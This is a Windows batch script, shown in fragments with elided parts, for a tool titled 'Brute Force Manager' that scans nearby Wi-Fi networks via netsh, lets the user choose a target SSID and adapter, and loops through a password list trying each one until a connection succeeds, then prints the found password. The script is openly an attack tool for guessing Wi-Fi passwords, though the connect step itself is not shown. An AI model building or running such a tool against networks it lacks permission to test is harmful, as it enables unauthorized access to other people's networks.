@echo off
	...
	echo.
	call "BF_Files\colorchar.exe" /0b " Interface Detection"
	echo.
	echo.
	call "BF_Files\colorchar.exe" /0e " Only '1' Interface Found!"
	echo.
	echo.
	call "BF_Files\colorchar.exe" /0f " !interface_1_description!("
	call "BF_Files\colorchar.exe" /09 "!interface_1_mac!"
	call "BF_Files\colorchar.exe" /0f ")"
	echo.
	echo.
	...
	echo.
	echo.
	call "BF_Files\colorchar.exe" /0e " Multiple '!interface_number!' Interfaces Found!"
	echo.
	timeout /t 3 >nul
	...
	echo.
	echo.
	call "BF_Files\colorchar.exe" /0e " WARNING"
	echo.
	...
	echo.
	echo  [---------------------------------------------------------------------------]
call "BF_Files\colorchar.exe" /0b " Brute Force Manager Version 1.1.2 "
	echo.
	call "BF_Files\colorchar.exe" /0e "  Developed By TUX"
	echo.
	echo  [---------------------------------------------------------------------------]
	echo.
	...
	call "BF_Files\colorchar.exe" /0b "   Target - " 
	echo !targetwifi!
	call "BF_Files\colorchar.exe" /0b "   Interface - "
	echo !interface_description!
	echo.
	echo    Type "help" for more info
	
	call "BF_Files\colorchar.exe" /0F 1 19 76 25
	echo.
	echo.
	call :userinput
	...
	if !mainmenuchoice!==help (
		cls
		echo.
		call "BF_Files\colorchar.exe" /0b " Help Page"
		echo.
		echo.
	...
	set /a attempt=1
		...
		if "!targetwifi!"=="No WI-FI Selected" (
			call "BF_Files\colorchar.exe" /0c " Please select a WI-FI..."
			echo.
			echo.
			echo  Press any key to continue...
			timeout /t 5 >nul
		...
		if "!interface_description!"=="Not Selected" (
			call "BF_Files\colorchar.exe" /0c " Please select an interface..."
			echo.
			echo.
			echo  Press any key to continue...
			timeout /t 5 >nul
		...
		cls
		echo.
		call "BF_Files\colorchar.exe" /0b " Processing passlist..."
		echo.
	...
	for /f "tokens=1" %%a in ( passlist.txt ) do (
		...
		cls
		echo  [==================================================]
		call "BF_Files\colorchar.exe" /07 "  Target WI-FI: "
		echo !targetwifi!
		call "BF_Files\colorchar.exe" /07 "  Total Passwords: "
		call "BF_Files\colorchar.exe" /0f "!password_number!"
		echo.
		call "BF_Files\colorchar.exe" /07 "  Percentage: "
		echo  %% !pass_percentage!	
		echo  [==================================================]
		call "BF_Files\colorchar.exe" /0b "  Trying the password -" 
		echo  !temppass!
		echo  [==================================================]
		call "BF_Files\colorchar.exe" /0e "  Attempt -"
		echo  !attempt!
		echo  [==================================================]
		echo   Current State:
		...
		echo.
		echo  [==================================================]
		call "BF_Files\colorchar.exe" /0c "  Password not found. :'("
		echo.
		echo  [==================================================]
		echo.
		echo  Press any key to continue...
	...
	call "BF_Files\colorchar.exe" /0c " Invalid input"
	timeout /t 2 >nul
	goto :main
	...
	cls
		...
		echo.
		call "BF_Files\colorchar.exe" /0c " You have to select an interface to perform a scan..."
		echo.
		echo.
		echo  Press any key to continue...
		timeout /t 5 >nul
		...
		if !interface_number!==0 (
		echo.
		call "BF_Files\colorchar.exe" /0c " You have at least '1' WI-FI interface to perform a scan..."
		echo.
		echo.
		echo  Press any key to continue...
		timeout /t 5 >nul
		...
		set /a keynumber=0
		echo.
		call "BF_Files\colorchar.exe" /0b " Possible WIFI Networks"
		echo.
		echo.
		call "BF_Files\colorchar.exe" /0f " Using "
		call "BF_Files\colorchar.exe" /0e "!interface_description!"
		call "BF_Files\colorchar.exe" /0f " for scanning..."
		echo.
		...
		for /f "tokens=1-4" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (
			...
			set current_signal==%%c
				...
				if !text_available!==true (
					call "BF_Files\colorchar.exe" /08 " !keynumber! - "
					call "BF_Files\colorchar.exe" /0f "!current_ssid!"
					call "BF_Files\colorchar.exe" /03 " - !current_signal:~1,5!"
					echo.
				...
				call "BF_Files\colorchar.exe" /0e " !keynumber! - "
				call "BF_Files\colorchar.exe" /0c "Unsupported Char"
				echo.
		...
		call "BF_Files\colorchar.exe" /08 " !keynumber! - "
		call "BF_Files\colorchar.exe" /07 "Cancel Selection"
		
		
		echo.
		echo.
		call "BF_Files\colorchar.exe" /0b " Please choice a wifi or cancel(1-!keynumber!)"
		echo.
		set choice=
		call "BF_Files\colorchar.exe" /0e " wifi"
		call "BF_Files\colorchar.exe" /0f "@"
		call "BF_Files\colorchar.exe" /08 "select"
		call "BF_Files\colorchar.exe" /0f "[]-"
		set /p choice=
		...
		if %%a==!choice! (
				...
				if %%c==Unsupported (
					call "BF_Files\colorchar.exe" /0c " This SSID is unsupported..."
					timeout /t 3 >nul
					cls
					goto :skip_disconnection
				)else (
					...
					if !signal_strength! lss 50 (
						echo.
						call "BF_Files\colorchar.exe" /0c " Low signal[!signal_strength!] strengths are not recommended."
						echo.
						echo  Do you want to continue anyway?[Y-N]
						set choice=
						call "BF_Files\colorchar.exe" /0e " continue"
						call "BF_Files\colorchar.exe" /0f "@"
						call "BF_Files\colorchar.exe" /08 "select"
						call "BF_Files\colorchar.exe" /0f "[]-"
						set /p choice=
	...
	:userinput
	call "BF_Files\colorchar.exe" /0a " cmd"
	call "BF_Files\colorchar.exe" /0f "@"
	call "BF_Files\colorchar.exe" /08 "user"
	call "BF_Files\colorchar.exe" /0f "[]-"
	goto :eof
	...
	call "BF_Files\colorchar.exe" /0b " Interface Selection"
	echo.
	echo.
	for /l %%a in ( 1, 1, !interface_number! ) do (
		
		call "BF_Files\colorchar.exe" /08 " !temp_interface_num_for_selection! - "
		call "BF_Files\colorchar.exe" /0f "!interface_%%a_description!("
		call "BF_Files\colorchar.exe" /09 "!interface_%%a_mac!"
		call "BF_Files\colorchar.exe" /0f ")"
		echo.
	...
	echo.
	call "BF_Files\colorchar.exe" /0e " interface"
	call "BF_Files\colorchar.exe" /0f "@"
	call "BF_Files\colorchar.exe" /08 "select"
	call "BF_Files\colorchar.exe" /0f "[]-"
	...
	for /f "tokens=1-3" %%a in ( interfacelist.txt ) do (
		...
		call "BF_Files\colorchar.exe" /0f " Setting "
		call "BF_Files\colorchar.exe" /0e "!interface_description!"
		call "BF_Files\colorchar.exe" /f " as current interface..."
		timeout /t 3 >nul
	...
	del WIFI_Report.txt
			cls
			echo  [==================================================]
			call "BF_Files\colorchar.exe" /0b "  WIFI Brute Force Results"
			echo.
			echo  [==================================================]
			call "BF_Files\colorchar.exe" /0f "  SSID: "
			call "BF_Files\colorchar.exe" /0e "!targetwifi!"
			echo.
			call "BF_Files\colorchar.exe" /0f "  Password: "
			call "BF_Files\colorchar.exe" /0a "!temppass!"
			echo.
			call "BF_Files\colorchar.exe" /0f "  Attempts: "
			call "BF_Files\colorchar.exe" /09 "!attempt!"
			echo.
			echo  [==================================================]
			echo.
	...
	:find_connection_state
		...
		call "BF_Files\colorchar.exe" /0f " Associating..."
		echo.
		)
		if !interface_state!==disconnecting (
		call "BF_Files\colorchar.exe" /0c " Disconnecting..."
		echo.
		)
		if !interface_state!==disconnected (
		call "BF_Files\colorchar.exe" /04 " Disconnected."
		echo.
		)
		if !interface_state!==authenticating (
		call "BF_Files\colorchar.exe" /0a " Authenticating..."
		echo.
		)
		if !interface_state!==connecting (
		call "BF_Files\colorchar.exe" /02 " Connecting..."
		echo.
		)
		if !interface_state!==connected (
		call "BF_Files\colorchar.exe" /02 " CONNECTED."
		echo.
